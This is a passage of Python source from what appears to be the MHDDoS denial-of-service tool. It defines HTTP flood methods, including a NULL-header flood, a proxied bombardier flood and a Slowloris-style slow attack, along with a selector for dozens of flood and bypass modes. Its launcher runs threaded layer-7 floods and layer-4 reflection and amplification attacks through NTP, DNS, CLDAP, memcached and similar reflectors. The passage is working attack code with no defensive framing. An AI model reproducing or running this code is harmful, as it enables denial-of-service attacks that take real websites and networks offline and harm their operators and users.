            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(
            self._payload
            + "Host: %s\r\n" % self._target.authority
            + "User-Agent: null\r\n"
            + "Referrer: null\r\n"
            + self.SpoofIP
            + "\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def BOMB(self):
        assert self._proxies, (
            "This method requires proxies. " "Without proxies you can use github.com/codesenberg/bombardier"
        )

        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break

        bombardier_path = Path.home() / "go/bin/bombardier"
        res = run(
            [
                f"{bombardier_path}",
                f"--connections={self._rpc}",
                "--http2",
                "--method=GET",
                "--latencies",
                "--timeout=30s",
                f"--requests={self._rpc}",
                f"--proxy={proxy}",
                f"{self._target.human_repr()}",
            ],
            stdout=PIPE,
        )
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep="\n")

    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
            while Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep, self.REQUESTS_SENT, self.BYTES_SEND)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "POST":
            self.SENT_FLOOD = self.POST
        elif name == "CFB":
            self.SENT_FLOOD = self.CFB
        elif name == "CFBUAM":
            self.SENT_FLOOD = self.CFBUAM
        elif name == "XMLRPC":
            self.SENT_FLOOD = self.XMLRPC
        elif name == "BOT":
            self.SENT_FLOOD = self.BOT
        elif name == "APACHE":
            self.SENT_FLOOD = self.APACHE
        elif name == "BYPASS":
            self.SENT_FLOOD = self.BYPASS
        elif name == "DGB":
            self.SENT_FLOOD = self.DGB
        elif name == "OVH":
            self.SENT_FLOOD = self.OVH
        elif name == "AVB":
            self.SENT_FLOOD = self.AVB
        elif name == "STRESS":
            self.SENT_FLOOD = self.STRESS
        elif name == "DYN":
            self.SENT_FLOOD = self.DYN
        elif name == "SLOW":
            self.SENT_FLOOD = self.SLOW
        elif name == "GSB":
            self.SENT_FLOOD = self.GSB
        elif name == "NULL":
            self.SENT_FLOOD = self.NULL
        elif name == "COOKIE":
            self.SENT_FLOOD = self.COOKIES
        elif name == "PPS":
            self.SENT_FLOOD = self.PPS
            self._defaultpayload = (self._defaultpayload + "Host: %s\r\n\r\n" % self._target.authority).encode()
        elif name == "EVEN":
            self.SENT_FLOOD = self.EVEN
        elif name == "DOWNLOADER":
            self.SENT_FLOOD = self.DOWNLOADER
        elif name == "BOMB":
            self.SENT_FLOOD = self.BOMB
        elif name == "KILLER":
            self.SENT_FLOOD = self.KILLER


def main(
    url,
    ip,
    method,
    threads,
    event,
    thread_pool,
    proxies,
    rpc=None,
    refl_li_fn=None,
    statistics=None,
    sock_timeout=5,
):
    REQUESTS_SENT = statistics["requests"]
    BYTES_SEND = statistics["bytes"]
    global SOCK_TIMEOUT
    SOCK_TIMEOUT = sock_timeout

    if method not in Methods.ALL_METHODS:
        exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))

    if method in Methods.LAYER7_METHODS:
        useragent_li = ROOT_DIR / "files/useragent.txt"
        referers_li = ROOT_DIR / "files/referers.txt"
        bombardier_path = Path.home() / "go/bin/bombardier"

        if method == "BOMB":
            assert bombardier_path.exists() or bombardier_path.with_suffix(".exe").exists(), (
                "Install bombardier: " "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
            )

        if not useragent_li.exists():
            exit("The Useragent file doesn't exist ")
        if not referers_li.exists():
            exit("The Referer file doesn't exist ")

        uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
        referers = set(a.strip() for a in referers_li.open("r+").readlines())

        if not uagents:
            exit("Empty Useragent File ")
        if not referers:
            exit("Empty Referer File ")

        for thread_id in range(threads):
            thread_pool.submit(
                HttpFlood(
                    thread_id,
                    url,
                    ip,
                    method,
                    rpc,
                    event,
                    uagents,
                    referers,
                    proxies,
                    REQUESTS_SENT,
                    BYTES_SEND,
                ).run
            )

    if method in Methods.LAYER4_METHODS:
        port = url.port

        if not port:
            logger.warning("Port Not Selected, Set To Default: 80")
            port = 80

        if 65535 < port < 1:
            exit("Invalid Port [Min: 1 / Max: 65535] ")

        ref = None

        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
            refl_li = ROOT_DIR / "files" / refl_li_fn

            if not refl_li.exists():
                exit("The reflector file doesn't exist")

            ref = set(a.strip() for a in ProxyTools.Patterns.IP.findall(refl_li.open("r+").read()))

        if ref is None:
            exit("Empty Reflector File ")

        for _ in range(threads):
            thread_pool.submit(Layer4((ip, port), ref, method, event, proxies, REQUESTS_SENT, BYTES_SEND).run)
